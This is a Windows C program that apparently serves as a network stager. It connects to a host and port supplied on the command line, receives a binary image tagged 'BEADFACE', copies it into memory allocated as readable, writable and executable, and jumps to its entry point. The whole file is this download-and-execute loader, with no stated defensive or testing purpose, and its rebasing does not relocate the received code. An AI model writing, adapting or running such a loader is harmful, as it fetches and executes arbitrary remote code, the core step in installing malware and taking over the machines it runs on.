#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
//#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <basetsd.h>

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char** argv) {
	WSADATA wsaData;
	SOCKET sock;
	//struct sockaddr_in sockaddr;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	char* ip_str;
	char* port_str;
	char* image_buffer;
	uint64_t port;
	uint64_t image_size;
	uint64_t base;
	uint64_t entry;
	uint64_t end_address;
	uint64_t mem_begin;
	uint64_t mem_end;
	void* mem_ptr;
	size_t len;
	if (argc < 2) {
		fprintf(stderr, "usage: %s <ip(:port)>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	ip_str = strtok(argv[1], ":");
	port_str = strtok(NULL, ":");
	port_str = (port_str == NULL ? "2137" : port_str);
	// port = (port_str == NULL ? strtol(port_str, NULL, 10) : 2137);
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed: %d\n", WSAGetLastError());
		exit(EXIT_FAILURE);
	}
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		fprintf(stderr, "socket() failed: %d\n", WSAGetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo(ip_str, port_str, &hints, &result) != 0) {
		fprintf(stderr, "getaddrinfo() failed: %d\n", WSAGetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	if (connect(sock, result->ai_addr, result->ai_addrlen) == SOCKET_ERROR) {
		fprintf(stderr, "connect() failed: %d\n", WSAGetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	len = recv(sock, (char*)&image_size, sizeof(image_size), 0);
	if (len <= 0) {
		fprintf(stderr, "recv() failed: %d\n", WSAGetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	printf("incoming image of size: %llu\n", image_size);
	image_buffer = (char*)malloc(image_size);
	if (image_buffer == NULL) {
		fprintf(stderr, "malloc() failed: %d\n", GetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	len = 0;
	while (len < image_size) {
		size_t remain = image_size - len;
		size_t bread = 0;
		bread = recv(sock, image_buffer + len, remain, 0);
		if (bread <= 0) {
			fprintf(stderr, "recv() failed: %d\n", WSAGetLastError());
		WSACleanup();
			exit(EXIT_FAILURE);
		}
		len += bread;
	}
	if (len != image_size) {
		fprintf(stderr, "expected %llu, got %llu\n", image_size, len);
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	if (closesocket(sock) != 0) {
		fprintf(stderr, "closesocket() failed: %d\n", WSAGetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	printf("read %llu bytes of payload\n", len);
	if (image_size < 24) {
		fprintf(stderr, "invalid image\n");
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	if (strncmp("BEADFACE", image_buffer, 8) != 0) {
		fprintf(stderr, "invalid magic\n");
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	entry = *(((uint64_t*)image_buffer) + 1);
	base = *(((uint64_t*)image_buffer) + 2);
	end_address = base + (image_size - 24);
	mem_begin = (base & ~0xffff);
	mem_end = (end_address + 0xffff) & ~0xffff;
	printf("attempting to allocate range 0x%llx-0x%llx (%lld bytes) | ",
            mem_begin, mem_end, mem_end - mem_begin);
	mem_ptr = VirtualAlloc(mem_begin, mem_end - mem_begin,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (mem_ptr == NULL) {
		fprintf(stderr, "VirtualAlloc() failed: %d\n", GetLastError());
		WSACleanup();
		exit(EXIT_FAILURE);
	}
	printf("got %p\n", mem_ptr);
	if (base != (uint64_t)mem_ptr) {
		printf("rebasing to allocated memory at %p\n", mem_ptr);
		base = (uint64_t)mem_ptr;
	}
	entry += base;
	memcpy(mem_ptr, image_buffer + 24, image_size - 24);
	
	printf("jumping to %d\n", entry);
	((void (*)(void))entry)();
	return 0;
}
